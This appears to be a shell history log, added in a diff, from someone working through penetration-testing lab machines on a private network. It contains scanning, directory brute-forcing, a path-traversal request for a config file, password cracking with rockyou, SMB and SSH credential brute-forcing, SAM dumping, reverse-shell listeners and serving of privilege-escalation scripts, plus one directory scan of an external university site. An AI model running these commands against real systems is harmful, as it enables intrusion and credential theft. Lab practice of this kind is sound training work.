@@ -1,0 +1,995 @@
+    1  ls /bin
+    2  sudo su
+    3  whoami
+    4  id
+    5  su root
+    6  cat /etc/shadow
+    7  ls -la /etc/shadow
+    8  cd ..
+    9  ls
+   10  cd
+   11  ls
+   12  cd Desktop
+   13  ls
+   14  touch prueba.txt
+   15  touch .oculto.txt
+   16  ls
+   17  ls -a
+   18  ls
+   19  mkdir Desktop/a
+   20  touch Desktop/a/l.txt
+   21  ls Desktop/a
+   22  echo "hola" > Desktop/a/l.txt
+   23  cat Desktop/a/l.txt
+   24  rm -r a
+   25  cd Desktop
+   26  rm -r a
+   27  ls /Home/cris98/Desktop
+   28  pwd
+   29  ls /ome/cris98/Desktop
+   30  ls /home/cris98/Desktop
+   31  ifconfig
+   32  nmap -sn 192.168.254.0/24
+   33  ls
+   34  cd Desktop
+   35  mkdir bolt
+   36  cd bolt
+   37  sudo arp-scan -l
+   38  sudo nmap -p- -sS 192.168.254.131 -T4 -oN allports.txt
+   39  sudo nmap -p 22,80,11,2049,8080,33721,39623,43851,47509 -sVC -oN servicios.txt -v 192.168.254.131
+   40  sudo nmap -p 22,80,111,2049,8080,33721,39623,43851,47509 -sVC -oN servicios.txt -v 192.168.254.131
+   41  sudo nmap -p 22,80,111,2049,8080,33721,39623,43851,47509 -o 192.168.254.131
+   42  sudo nmap -p 22,80,111,2049,8080,33721,39623,43851,47509 -O 192.168.254.131
+   43  showmount
+   44  showmount -e 192.168.254.131
+   45  ls /mnt
+   46  mkdir nfs
+   47  sudo mount -t nfs 192.168.254.131:/srv/nfs /home/cris98/bolt/nfs
+   48  pwd
+   49  sudo mount -t nfs 192.168.254.131:/srv/nfs /home/cris98/Desktop/bolt/nfs
+   50  cd nfs
+   51  ls
+   52  unzip -l save.zip
+   53  unzip save.zip
+   54  cp save.zip ..
+   55  cd ..
+   56  ls
+   57  sudo apt install fcrackzip 
+   58  fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
+   59  fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt.gz save.zip
+   60  ls
+   61  fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
+   62  ls /usr/share/wordlists
+   63  unzip -l /usr/share/wordlists/rockyou.txt.gz
+   64  cd /usr/share/wordlists
+   65  ls
+   66  gzip -d rockyou.txt.gz
+   67  sudo gzip -d rockyou.txt.gz
+   68  ls
+   69  cd
+   70  ls
+   71  cd D
+   72  cd Desktop
+   73  cd bolt
+   74  ls
+   75  fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
+   76  unzip save.zip
+   77  ls
+   78  cat bandera1.txt
+   79  cd Desktop
+   80  cd bolt
+   81  searchsploit OpenSSH 7.
+   82  searchsploit apache 2.4.38
+   83  gobuster dir -u http://192.168.254.131/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+   84  gobuster dir -u http://192.168.254.131/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -re -o /Desktop/bolt/urls_80.txt
+   85  cd Desktop
+   86  cd bolt
+   87  gobuster dir -u http://192.168.254.131/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -re -o urls_80.txt
+   88  cat urls_80.txt
+   89  arp-scan -l
+   90  arp-scan -
+   91  arp-scan
+   92  sudo arp-scan -l
+   93  ifconfig
+   94  hash-identifier 9efc6c84814e08868efb52d2b5a7a38c
+   95  cd Desktop
+   96  git clone https://github.com/carlospolop/PEASS-ng.git
+   97  ls
+   98  cd PEASS-ng
+   99  ls
+  100  cd metasploit
+  101  ls
+  102  cd ..
+  103  cd build_lists
+  104  ls
+  105  cd ..
+  106  cd linPEAS
+  107  ;s
+  108  ls
+  109  cd ..
+  110  ls -a
+  111  cd linPEAS
+  112  ls
+  113  cd builder
+  114  ls
+  115  cd ..
+  116  ls /linpeas_parts
+  117  ks
+  118  ls
+  119  cd builder
+  120  ls
+  121  cd linpeas_parts
+  122  ls
+  123  locate linpeas
+  124  cd ..
+  125  ls
+  126  mkdir li
+  127  cd li
+  128  cd /tmp
+  129  ls
+  130  cd 
+  131  cd Desktop
+  132  cd navigator
+  133  ls
+  134  cd 192.168.254.132
+  135  ls
+  136  vim linpeas.sh
+  137  python3 -m http.server 80
+  138  ls
+  139  rm linpeas.sh
+  140  ls
+  141  cd ../../../Downloads/linpeas.sh .
+  142  ls
+  143  chmod +x linpeas.sh
+  144  pwd
+  145  cp /home/cris98/Desktop/navigator/192.168.254.132/linpeas.sh .
+  146  ls
+  147  python3 -m http.server 80
+  148  python3 -m http.server 81
+  149  python3 -m http.server 80
+  150  ls
+  151  cd Downloads
+  152  ls
+  153  less navabout
+  154  cat navabout
+  155  cd ..
+  156  cd Desktop
+  157  ls
+  158  cd navigator
+  159  ls
+  160  cd 192.168.254.132
+  161  curl http://navigator.hm/navigate
+  162  whatweb http://navigator.hm/navigate
+  163  searchsploit navigate
+  164  searchsploit navigate cms
+  165  searchsploit -x 45615
+  166  curl -X GET "http://navigator.hm/navigate/navigate_download.php?wid=1&id=../../../cfg/globals.php\n"
+  167  sudo curl -X GET "http://navigator.hm/navigate/navigate_download.php?wid=1&id=../../../cfg/globals.php\n"
+  168  sudo curl -X GET "http://navigator.hm/navigate/navigate_download.php?wid=1&id=../../../cfg/globals.php"
+  169  msfconsole
+  170  mkdir kio
+  171  cd kio
+  172  gobuster dir -u http://192.168.254.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -re -o urls_80.txt
+  173  gobuster dir -u http://192.168.254.130/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  174  sudo su
+  175  su root
+  176  sudo arp-scan -l
+  177  su root
+  178  ls
+  179  cd Desktop
+  180  ls
+  181  su root
+  182  systemctl nessusd start
+  183  systemct  start nessusd
+  184  systemctl  start nessusd
+  185  systemctl  status nessusd
+  186  ls
+  187  cd eternal
+  188  ls
+  189  de 192.168.254.133
+  190  ls
+  191  cd 192.168.254.133
+  192  ls
+  193  crackmapexec smb 192.168.153.135 -u "Hacker Mentor User" -p "P@$$w0rd"
+  194  crackmapexec smb 192.168.153.135 -u 'Hacker Mentor User' -p 'P@$$w0rd'
+  195  crackmapexec smb 192.168.254.135 -u 'Hacker Mentor User' -p 'P@$$w0rd'
+  196  su root
+  197  cd monkey
+  198  cd 192.168.254.136
+  199  su root
+  200  cd monkey
+  201  cd 192.168.254.136
+  202  ls
+  203  searchsploit vsftpd 3.0.3
+  204  searchsploit httpd 2.4.38
+  205  ftp 192.168.254.136
+  206  ftp 192.168.254.136\
+  207  ftp 192.168.254.136
+  208  vim notas.txt
+  209  su root
+  210  nc -lvnp 8002
+  211  ifconfig
+  212  su root
+  213  cd
+  214  cd Do
+  215  cd Downloads
+  216  touch imagen.png
+  217  touch imagen.jpg
+  218  touch imagen.php
+  219  touch imagen.js
+  220  nano imagen.php
+  221  less imagen.php
+  222  ipconfig
+  223  ifconfig
+  224  ls
+  225  nano imagen.php
+  226  nc -lvnp 8001
+  227  cd  ..
+  228  cd Downloads
+  229  ls
+  230  pwd
+  231  cd ..
+  232  cd Desktop
+  233  cd monkey
+  234  cd 192.168.254.136
+  235  cp /home/cris98/Downloads .
+  236  cp /home/cris98/Downloads/pspy64 .
+  237  cp /home/cris98/Downloads/pspy64/ .
+  238  su root
+  239  cd monkey
+  240  cd 192.168.254.136
+  241  ls
+  242  less notas.txt
+  243  echo "8d2473d579e5a11924906def258f97a1" >> hash.txt
+  244  hashid 8d2473d579e5a11924906def258f97a1
+  245  hash-identifier 8d2473d579e5a11924906def258f97a1
+  246  ls
+  247  echo "junior01" >> password.txt 
+  248  cat password.txt
+  249  echo "junior01" > password.txt 
+  250  su root
+  251  cd
+  252  ls
+  253  cd Downloads
+  254  ls
+  255  pwd
+  256  su root
+  257  cd bold
+  258  ls
+  259  cd 192.168.254.131
+  260  ls
+  261  pwd
+  262  locate linpeas
+  263  cp /home/cris98/Desktop/navigator/192.168.254.132/linpeas.sh .
+  264  su root
+  265  su root 
+  266  ping https://ssucbba.org/
+  267  https://ssucbba.org
+  268  ping https://ssucbba.org
+  269  ls
+  270  sudo
+  271  su root
+  272  ping 172.67.173.185
+  273  python --v
+  274  python --version
+  275  wifite
+  276  sudo wifite
+  277  sudo apt-get update 
+  278  ]
+  279  lsusb
+  280  sudo apt-get dist-upgrade
+  281  gobuster man
+  282  gobuster --help
+  283  gobuster dir -u http://undefined.tis.cs.umss.edu.bo/  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  284  gobuster dir -u 'http://undefined.tis.cs.umss.edu.bo/'  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  285  ping http://undefined.tis.cs.umss.edu.bo/
+  286  ping http://undefined.tis.cs.umss.edu.bo
+  287  ping google.com
+  288  ping undefined.tis.cs.umss.edu.bo
+  289  ping undefined.tis.cs.umss.edu.bo/
+  290  ping undefined.tis.cs.umss.edu.bo
+  291  dd
+  292  ls
+  293  mkdir maquinas
+  294  cd maquinas
+  295  mkdir kio
+  296  cd kio
+  297  arp-scan
+  298  sudo arp-scan -l
+  299  mkdir 30
+  300  cd 30
+  301  sudo netdiscover -r 192.168.254.0/24
+  302  nmap -sn 192.168.254.0/24
+  303  nmap -sP 192.168.254.0/24
+  304  nmap --man
+  305  nmap -man
+  306  nmap -help
+  307  sudo nmap -A -v 192.168.254.130
+  308  sudo namp -sS -p- -T4 192.168.254.130 -oN puertos.txt
+  309  sudo nmap -sS -p- -T4 192.168.254.130 -oN puertos.txt
+  310  /usr/share/nmap/scripts/ | grep default
+  311  /usr/share/nmap/scripts/ | grep "default"
+  312  grep "default" /usr/share/nmap/scripts
+  313  grep "categories" /usr/share/nmap/scripts/* | grep  default
+  314  sudo namp -sV -sC -p 
+  315  sudo namp -sV -sC -p 22,80,111,139,443,1024 192.168.254.130 -oN versiones.txt
+  316  sudo nmap -sV -sC -p 22,80,111,139,443,1024 192.168.254.130 -oN versiones.txt
+  317  dirb http://192.168.254.130-
+  318  dirb http://192.168.254.130/
+  319  gobuster dir -u 'http://192.168.254.130/'  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  320  metasploit
+  321  msfconsole
+  322  cd maquinas
+  323  ls
+  324  cd kio
+  325  cd 30
+  326  ls
+  327  cat puertos.txt
+  328  searchsploit samba 
+  329  searchsploit samba 2.2.1a
+  330  ifconfig
+  331  ls
+  332  less puertos.txt
+  333  ssh root@192.168.254.130
+  334  cd maquinas
+  335  cd kio
+  336  cd 30
+  337  ls
+  338  cat explotacion.txt
+  339  clear
+  340  sudo nmap -p- -sS -T3 192.168.254.137 -oN puertos.txt
+  341  ls
+  342  rm puertos.txt
+  343  ls
+  344  cd maquinas
+  345  cd eternal
+  346  cd 137
+  347  sudo nmap -p- -sS -T4 192.168.254.137
+  348  sudo namp -sV -sC -p 135,139,445,5357,49152-49157 192.168.254.137 -oN services.txt
+  349  sudo nmap -sV -sC -p 135,139,445,5357,49152-49157 192.168.254.137 -oN services.txt
+  350  crackmapexec smb 192.168.254.137
+  351  smbclient -L 192.168.254.137
+  352  rpcclient 192.168.254.137 -U '' -N
+  353  arp-scan =L
+  354  sudo arp-scan -l
+  355  ls
+  356  cd maquinas
+  357  ls
+  358  mkdir eternal
+  359  cd eternal
+  360  mkdir 137
+  361  cd 137
+  362  ping 192.168.254.137
+  363  gobuster dir -u 'http://192.168.254.137/'  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  364  nikto -h'http://192.168.254.137/'
+  365  nikto -h 'http://192.168.254.137/'
+  366  nikto -help
+  367  crackmapexec smb 192.168.254.137
+  368  crackmapexec --help
+  369  ulnj
+  370  ulnj
+  371  sudo namp -sS -p- -T4 192.168.254.130
+  372  sudo nmap -sS -p- -T4 192.168.254.130
+  373  sudo nmap -sS -p- -T4 192.168.254.137
+  374  hashcat 
+  375  hashcat  --help
+  376  cat /etc/passwd
+  377  ls /usr/share/nmap/scripts | grep http
+  378  ls /usr/share/nmap/scripts | grep https
+  379  msfconsole
+  380  systemctl  status nessusd
+  381  systemctl start nessusd
+  382  systemctl  status nessusd
+  383  systemctl  stop nessusd
+  384  systemctl start nessusd
+  385  ls /usr/share/nmap/scripts
+  386  ls /usr/share/nmap/scripts | grep vuln
+  387  sudo nmap -p 445,135,139,5357,49152-49157 --script smb*,vuln 192.168.254.137 
+  388  sudo nmap -p 445,135,139,5357,49152-49157 --script vuln 192.168.254.137 
+  389  root
+  390  sudo rot
+  391  sudo root
+  392  sudo su root
+  393  docker ps 
+  394  sudo su
+  395  su root 
+  396  sudo su
+  397  ls
+  398  cd maquinas
+  399  cd eternal
+  400  cd 137
+  401  sudo nmap -p 445,135,139,5357,49152-49157 --script vuln 192.168.254.137 
+  402  msf
+  403  mfsconsole
+  404  msfconsole
+  405  arp-scan -l
+  406  cd maquinas
+  407  ls
+  408  cd maquinas
+  409  ls
+  410  arp-scan -l
+  411  sudo arp-scan -l
+  412  mkdir 138
+  413  cd 138
+  414  sudo nmap -p- -T4 -sS 192.168.254.138 -oN puertos.txt
+  415  cd maquinas
+  416  cd monkey
+  417  cd 139
+  418  ping 192.168.254.139
+  419  ping 192.168.254.138
+  420  vim usuarios.txt
+  421  searchsploit vsftpd 3.0.3
+  422  searchsploit OpenSSH 7.9p1
+  423  searchsploit Apache httpd 2.4.38
+  424  cd maquinas
+  425  cd monkey
+  426  cd 139
+  427  vim password.txt
+  428  cd maquinas
+  429  cd monkey
+  430  cd 1
+  431  cd 139
+  432  ls
+  433  cat notas.txt
+  434  vim usuarios.txt
+  435  cat usuarios.txt
+  436  echo "junio01" > password.txt
+  437  cat password.txt
+  438  echo "8d2473d579e5a11924906def258f97a1" >> password.txt
+  439  cat password.txt
+  440  cat servicios.txt
+  441  cd maquinas
+  442  ls
+  443  cd 138
+  444  ls
+  445  cd ..
+  446  rm 138
+  447  rm -r 138
+  448  ls
+  449  rm -r 138
+  450  mkdir monkey
+  451  cd monkey
+  452  arp-scan -l
+  453  sudo arp-scan -l
+  454  mkdir 139
+  455  cd 139
+  456  sudo nmap -p- -T4 -sS 192.168.254.139 -oN puertos.txt
+  457  gobuster dir -u 'http://192.168.254.139/' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  458  hashcat  --help
+  459  cat puertos.txt
+  460  sudo nmap -p 21,22,80 -sC -sV -O 192.168.254.139 -oN servicios.txt
+  461  ftp 192.168.254.139
+  462  gobuster dir -u 'http://192.168.254.139/' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  463  gobuster dir -u http://undefined.tis.cs.umss.edu.bo/  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  464  ifconfig
+  465  cd maquinas
+  466  cd monkey
+  467  cd 139
+  468  nc -lvnp 8002
+  469  cd maquinas
+  470  cd monkey
+  471  cd 139
+  472  ls
+  473  cat password.txt
+  474  echo "Grimmie" >> usuarios.txt
+  475  cat usuarios.txt
+  476  hash-identifier 8d2473d579e5a11924906def258f97a1
+  477  more password.txt
+  478  cat usuarios.txt
+  479  ls
+  480  cat notas.txt
+  481  hash-identifier 8d2473d579e5a11924906def258f97a1
+  482  ftp 192.168.254.139
+  483  vim archivo.php
+  484  cat archivo1.php
+  485  nano archivo1.php
+  486  cat archivo1.php
+  487  nano archivo1.php
+  488  cat archivo1.php
+  489  cat puertos.txt
+  490  ls /
+  491  ls/home/
+  492  ls /home/
+  493  pw
+  494  pwd
+  495  find -/home/cris98/ linpeas.sh
+  496  find -/home/cris98 linpeas.sh
+  497  find /home/cris98/ -name linpeas.sh
+  498  ping 192.168.254.139
+  499  cd maquinas
+  500  cd monkey
+  501  cd 1
+  502  ls
+  503  cd 139
+  504  ls
+  505  pwd
+  506  cd maquinas
+  507  cd monkey
+  508  cd 139
+  509  ls
+  510  cat password.txt
+  511  echo "M1_P4ssw0rd_segur@" >> password.txt
+  512  cat password.txt
+  513  crackmapexec ssh 192.168.254.139 -u 'hackermentor' -p password.txt
+  514  ssh hackermentor@192.168.254.139
+  515  cd Downloads
+  516  ls
+  517  cd ..
+  518  cd maquinas
+  519  cd monkey
+  520  cd 139
+  521  cp /Downloads/pspy64 .
+  522  cp /home/cris98/Downloads/pspy64/ .
+  523  cp /home/cris98/Downloads/pspy64 .
+  524  ls
+  525  nc -lvnp 8004
+  526  cd maquinas
+  527  cd monkey
+  528  cd 139
+  529  ls
+  530  cat archivo1.php
+  531  nc -lvnp 8002
+  532  cd maquinas
+  533  cd monkey
+  534  cd 139
+  535  ls
+  536  cat password.txt
+  537  nano p.txt
+  538  cat p
+  539  cat p.txt
+  540  john --format=Raw-MD5 p.txt --wordlists=/use/share/wordlists/rockyou.txt
+  541  john --format=Raw-MD5 p.txt --wordlists=/usr/share/wordlists/rockyou.txt
+  542  cat /usr/share/wordlists/rockyou.txt
+  543  john --format=Raw-MD5 p.txt --wordlist=/usr/share/wordlists/rockyou.txt
+  544  cd maquinas
+  545  cd monkey
+  546  cd 139
+  547  fin /home/cris98 -name linpeas.sh
+  548  find /home/cris98 -name linpeas.sh
+  549  cp /home/cris98/Desktop/monkey/192.168.254.136/linpeas.sh .
+  550  ls
+  551  python3 -m http.server 80
+  552  python3 -m http.server 8083
+  553  echo $SHELL
+  554  hashcat
+  555  sudo nmap -p 21,22,80 -sC -sV -O 192.168.254.139
+  556  man crunch
+  557  crunch 2 3 -o .
+  558  ls
+  559  cat START
+  560  rm START
+  561  ls
+  562  crunch 2 3 -o ./t.txt
+  563  ls
+  564  cat t.txt
+  565  crunch 3 5 hack -o ./d2.txt
+  566  cat d2.txt
+  567  crunch 2 2 19 -o ./tt.txt
+  568  cat tt.txt
+  569  cd ../ ../
+  570  cd ../../../Desktop
+  571  ls
+  572  mkdir crackingPassword
+  573  nano charset.txt
+  574  cat charset.txt
+  575  man crunch
+  576  q
+  577  cewl http://192.168.254.139/monkey
+  578  cewl http://192.168.254.139/monkey --winth-numbers -w ./cewl.txt
+  579  cewl http://192.168.254.139/monkey --with-numbers -w ./cewl.txt
+  580  cat cewl.txt
+  581  crackmapexec --help
+  582  man crackmapexec
+  583  crackmapexec --help
+  584  sudo nmap -p 22 192.168.254.139
+  585  cd crackingPassword
+  586  ls
+  587  cd ..
+  588  ls
+  589  rm cewl.txt
+  590  cat prueba.txt
+  591  rm prueba.txt
+  592  cd crackingPassword
+  593  vim usuarios.txt
+  594  vim password.txt
+  595  echo "M1_P4ssw0rd_segur@" >> password.txt
+  596  cat password.txt
+  597  hydra -l hackermentor -P password.txt -v 192.168.254.139 ssh
+  598  sudo arp-scan -l
+  599  searchsploit Samba 2.2.1a
+  600  ssh root@192.168.254.130
+  601  ls
+  602  cd maquinas
+  603  ls
+  604  cd kio
+  605  la
+  606  cd 30
+  607  sudo nmap -p- -T4 -sS 192.168.254.13 
+  608  sudo nmap -p- -T4 -sS 192.168.254.130
+  609  sudo nmap -p-  -sS 192.168.254.130
+  610  sudo nmap -p 22,80,111,139,443,1024 -sC -sV 192.168.254.130
+  611  msfconsole
+  612  cd maquinas
+  613  cd jenkis
+  614  cd 138
+  615  ls
+  616  scp t.txt butler@192.168.254.138:C:\Users\butler\Desktop
+  617  ping 192.168.254.138
+  618  cd maquinas
+  619  cd eternal
+  620  cd 137
+  621  ls
+  622  cat services.txt
+  623  sl
+  624  ls 
+  625  cat Ajewulmw.html
+  626  ping 192.168.254.138
+  627  ls
+  628  cd ..
+  629  cd .. ..
+  630  cd ../ ../
+  631  cd 
+  632  ls
+  633  cd maquinas
+  634  cd jenkis
+  635  cd 138
+  636  ls
+  637  vim jenkislist.txt
+  638  ls
+  639  cat jenkislist.txt
+  640  echo "jenkins" >> jenkislist.txt
+  641  cat jenkislist.txt
+  642  ls 
+  643  cat /home/cris98/maquinas/jenkis/138/jenkislist.txt
+  644  ping 192.168.254.138
+  645  uname -a
+  646  nc -lvpn 8001
+  647  nc -nlvp 8001
+  648  cd maquinas
+  649  ls
+  650  mkdir jenkis
+  651  cd jenkis
+  652  mkdir 138
+  653  cd 138
+  654  vim puertos.txt
+  655  sudo arp-scan -l
+  656  ping 192.168.254.138
+  657  vim servicios.txt
+  658  cat servicios.txt
+  659  sudo arp-scan -l
+  660  cewl http://192.168.254.138:8080  -w ./cewl.txt
+  661  ping 192.168.254.138
+  662  cat cewl.txt
+  663  cewl http://192.168.254.138:8080  ./cewl.txt
+  664  cewl http://192.168.254.138:8080 
+  665  rm cewl.txt
+  666  cewl http://192.168.254.138:8080 
+  667  crackmapexec smb 192.168.254.138
+  668  crackmapexec smb 192.168.254.138 -u 'butler' -p 'clave1234'
+  669  crackmapexec smb 192.168.254.138 -u 'butler' -p 'clave1234' --sam
+  670  find / -name linpeas.sh
+  671  find / -name linpeas.sh 2>/dev/null
+  672  ls /home/cris98/Downloads
+  673  cp /home/cris98/Downloads/winPEASx64.exe .
+  674  ls
+  675  python3 -m http.server 8083
+  676  sudo nmap -sn 192.168.254.0/24
+  677  cd maquinas
+  678  sudo namp -sS -p- -T4 192.168.254.138
+  679  sudo nmap -sS -p- -T4 192.168.254.138
+  680  sudo nmap -O 192.168.254.138
+  681  crackmapexec smb 192.168.254.138
+  682  ping 192.168.254.138
+  683  crackmapexec smb 192.168.254.138
+  684  cd jenkis
+  685  cd 138
+  686  cat puertos.txt
+  687  sudo nmap -p 135,139,445,5040,7680,8080,49664-49669 -sV -sC -T4 192.168.254.138
+  688  gobuster dir -u http
+  689  enum4linux -a 192.168.254.138
+  690  msfconsole
+  691  ls
+  692  msfconsole
+  693  ping 192.168.254.138
+  694  ifconfig
+  695  ls
+  696  vim t.txt
+  697  cd maquinas
+  698  cd junior
+  699  pwd
+  700  cp /home/cris98/maquinas/monkey/139/linpeas.sh .
+  701  ls
+  702  python3 -m http.server 8083
+  703  ls
+  704  python3 -m http.server 8083
+  705  msfconsole
+  706  nc -nlvp 8003
+  707  cd maquinas
+  708  cd junior
+  709  ls
+  710  find / -name linpeas.sh 2>/dev/null
+  711  find /usr -name linpeas.sh 2>/dev/null
+  712  find /home -name linpeas.sh 2>/dev/null
+  713  nano pass
+  714  nano password
+  715  unshadow pass password > contrase.txt
+  716  john contrase.txt
+  717  cat pass 
+  718  ls
+  719  rm contrase.txt
+  720  rm pass
+  721  rm password
+  722  nano password
+  723  nano shadow
+  724  unshadow password shadow > contra.txt
+  725  cat contra.txt
+  726  john contra.txt
+  727  ss marlinspike@192.168.254.140
+  728  ssh marlinspike@192.168.254.140
+  729  searchsploit ProFTPD 1.3.3c
+  730  msfconsole
+  731  sudo namp -sn 192.168.254.0/24
+  732  sudo nmap 192.168.254.0/24
+  733  sudo nmap -sn 192.168.254.0/24
+  734  sudo arp-scan -l
+  735  sudo nmap -sS -p- -T4 192.168.254.140
+  736  cd maquinas
+  737  ls
+  738  mkdir junior
+  739  cd junior
+  740  sudo nmap -sS -p- -T4 192.168.254.140 -oN puertos.txt
+  741  sudo nmap -p 22,21,80 -sV -sC 192.168.254.140 -oN versiones.txt
+  742  searchsploit ProFTPD 1.3.3C
+  743  gobuster dir -u http://192.168.254.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+  744  dirb http://192.168.254.140
+  745  wpscan --url http://vtcsec/secret/wp-login.php --usernames admin --passwords admin 
+  746  wpscan --url http://vtcsec/secret/wp-login.php --usernames 'admin' --passwords 'admin' 
+  747  wpscan --help
+  748  wpscan --url http://vtcsec/secret/ --usernames 'admin' --passwords 'admin' 
+  749  wpscan --url http://vtcsec/secret/ --usernames admin --passwords admin 
+  750  wpscan --help
+  751  wpscan --url http://vtcsec/secret/ --usernames admin --passwords /usr/share/wordlists/metasploit/http_default_pass.txt
+  752  msfconsole
+  753  searchsploit OpenSSL/0.9.6b
+  754  searchsploit OpenSSL
+  755  searchsploit OpenSSL 0.9
+  756  searchsploit OpenSSL 0.9.6b
+  757  gobuster dir -u http://192.168.254.130/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  758  searchsploit Samba 2.2.1a
+  759  sudo nmap -p 22,21,80 -sV -sC 192.168.254.140 -oN versiones.txt
+  760  ssh root@192.168.254.130
+  761  sudo nmap -sn 192.168.254.0/24
+  762  sudo arp-scan -l
+  763  sudo nmap -p- -sS -T4 192.168.254.130
+  764  sudo nmap -sV -sC -p 22,80,11,139,443,1024
+  765  sudo nmap -sV -sC -p 22,80,11,139,443,1024 192.168.254.10
+  766  sudo nmap -sV -sC -p 22,80,11,139,443,1024 192.168.254.130
+  767  msfconsole
+  768  ls 
+  769  cd D
+  770  cd Downloads
+  771  ls
+  772  su root
+  773  ls
+  774  mv AccessData_FTK_Imager_4.5.0_(x64).exe ftk.exe 
+  775  ls
+  776  su root
+  777  ls /usr/share/nmap/scripts | grep vuln
+  778  ls /usr/share/nmap/scripts | grep defautl
+  779  ls /usr/share/nmap/scripts
+  780  sudo arp-scan -l
+  781  msfconsole
+  782  cd maquinas
+  783  mkdir bolt
+  784  cd bolt
+  785  sudo arp-scan -l
+  786  ls
+  787  mkdir 141
+  788  cd 141
+  789  dirb http://192.168.254.141
+  790  sudo nmap -sS -p- -T4 192.168.254.141 -oN puertos.txt 
+  791  sudo nmap -O 192.168.254.141
+  792  sudo nmap -sS -p- -T4 192.168.254.141 -oN puertos.txt 
+  793  sudo nmap -sC -sV -p 22,80,111,2049,8080,41639,51987,55639,575779 192.168.254.141 -oN servicios.txt 
+  794  sudo nmap -sC -sV -p 22,80,111,2049,8080,41639,51987,55639,57579 192.168.254.141 -oN servicios.txt 
+  795  gobuster dir -u http://192.168.254.141 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+  796  cd maquinas
+  797  cd bolt
+  798  cd 141
+  799  ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.254.141/FUZZ
+  800  touch usuarios.txt
+  801  echo "bolt" >> usuarios.txt
+  802  touch password.txt
+  803  echo "I_love_java" >> password.txt
+  804  cat password.txt
+  805  echo "password" >> password.txt
+  806  cat password.txt
+  807  showmount -e 192.168.254.141
+  808  mkdir nfs
+  809  ls
+  810  sudo mount -t nfs 192.168.254.141://srv/nfs /home/cris98/maquinas/bolt/141
+  811  ls
+  812  tree
+  813  tree nfs
+  814  sudo mount -t nfs 192.168.254.141://srv/nfs /home/cris98/maquinas/bolt/141/nfs
+  815  sudo mount -t nfs 192.168.254.141://srv/nfs /home/cris98/maquinas/bolt/141/nfs/
+  816  ls
+  817  tree 
+  818  sudo mount -t nfs 192.168.254.141://srv/nfs /home/cris98/maquinas/bolt/141/nfs/
+  819  ls
+  820  ls ..
+  821  cd ..
+  822  ls 1
+  823  ls 141
+  824  cd 141
+  825  ls
+  826  l;s
+  827  ls
+  828  tree 
+  829  ls -la save.zip
+  830  cd ..
+  831  ls
+  832  rm -r 141
+  833  sudo rm -r 141
+  834  l;s
+  835  ls
+  836  sudo su root
+  837  cd maquinas
+  838  cd bolt
+  839  cd 141
+  840  pwd
+  841  ls
+  842  cd nfs
+  843  ls
+  844  ls 
+  845  cd ..
+  846  ls
+  847  cd maquinas
+  848  ls
+  849  mkdir 141
+  850  cd 141
+  851  cp ../puertos.txt .
+  852  ls
+  853  sudo nmap -sC -sV -p 22,80,111,2049,8080,41639,51987,55639,57579 192.168.254.141 -oN servicios.txt 
+  854  gobuster dir -u http://192.168.254.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
+  855  showmount -e 192.168.254.141
+  856  mkdir nfs
+  857  mount -t nfs 192.168.254.141://srv/nfs /home/cris98/maquinas/bolt/141/nfs 
+  858  ls
+  859  cd ..
+  860  ls
+  861  cd bolt
+  862  cd ..
+  863  rm -r 141
+  864  ls
+  865  rm puertos.txt
+  866  cd bolt
+  867  ls
+  868  cd 141
+  869  ls
+  870  sudo mount -t nfs 192.168.254.141://srv/nfs /home/cris98/maquinas/bolt/141/nfs/
+  871  ls
+  872  tree nfs
+  873  tree nfs
+  874  sudo mount -t nfs 192.168.254.141://srv/nfs /home/cris98/maquinas/bolt/141/nfs/
+  875  tree nfs
+  876  sudo mount -t nfs 192.168.254.141://srv/nfs /home/cris98/maquinas/bolt/141/nfs
+  877  tree nfs
+  878  sudo mount -t nfs 192.168.254.141:/srv/nfs /home/cris98/maquinas/bolt/141/nfs
+  879  tree nfs
+  880  sudo nmap -sC -sV -p 22,80,111,2049,8080,41639,51987,55639,57579 192.168.254.141 -oN servicios.txt 
+  881  cat puertos.txt
+  882  cd ..
+  883  ls
+  884  cd ..
+  885  ls
+  886  cd bolt
+  887  ls
+  888  rm puertos.txt
+  889  cd 141
+  890  ls
+  891  cd ..
+  892  cd maquinas
+  893  ls bolt
+  894  rm -r bolt
+  895  sudo su
+  896  mkdir bolt
+  897  sudo nmap -sS -p- -T4 192.168.254.141 -oN puertos.txt 
+  898  cd 141
+  899  pwd
+  900  ls ../
+  901  cd ..
+  902  cd bolt
+  903  ls
+  904  cp ../puertos.txt .
+  905  ls
+  906  cd p ../bolt .
+  907  cp p ../bolt .
+  908  cp  ../bolt .
+  909  cp -r ../bolt .
+  910  cp -r ./bolt .
+  911  cp -r ../bolt/ .
+  912  ls
+  913  cp -r ../141/ .
+  914  ls
+  915  rm -r bolt
+  916  ls
+  917  cd 141
+  918  cp ../puertos.txt .
+  919  ls
+  920  rm -r nfs
+  921  mkdir nfs
+  922  ls
+  923  ls nfs
+  924  cd nfs
+  925  ls
+  926  cd ..
+  927  cd..
+  928  cd ..
+  929  ls
+  930  sudo root
+  931  sudo su root
+  932  make -v
+  933  gcc -v
+  934  jekyll -v
+  935  gem -v
+  936  g++ -v
+  937  ls
+  938  cd Desktop
+  939  ls
+  940  mkdir portafolio
+  941  cd portafolio
